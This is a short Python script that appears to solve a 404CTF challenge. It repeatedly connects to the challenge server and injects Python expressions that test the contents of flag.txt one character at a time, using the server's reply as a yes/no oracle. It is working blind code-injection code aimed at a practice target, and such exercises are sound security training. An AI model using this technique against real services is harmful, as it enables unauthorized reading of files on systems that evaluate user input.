import socket
import base64
datafinale = ""
test = []
HOST = 'challenge.404ctf.fr'
PORT = 30806
valid = ['=','<','>','&','_','!','?','#','-','"',"'",'.',':','@','{','}','(',')','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9','+','/','_','*']
i = 0
while 1:
	j = 0
	while 1:
		client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		client.connect((HOST, PORT))
		donnees = client.recv(1024)
		#print(donnees.decode())
		#print ('Connexion vers ' + HOST + ':' + str(PORT) + ' reussie.')
		client.send(("open('flag.txt', 'r').readline()["+str(i)+"]=='"+valid[j]+"'\n").encode())
		#print("open('flag.txt', 'r').readline()["+str(i)+"]=='"+valid[j]+"'")
		#print(str(i)+"==>'"+valid[j]+"'")
		donnees = client.recv(1024)
		#print(donnees.decode())
		if("Vous avez choisi : pierre" in donnees.decode()):
			datafinale +=valid[j]
			break
		j+=1
	i+=1
	print(datafinale)	
client.close()
open('flag.txt', 'r').readline()[31]=='}'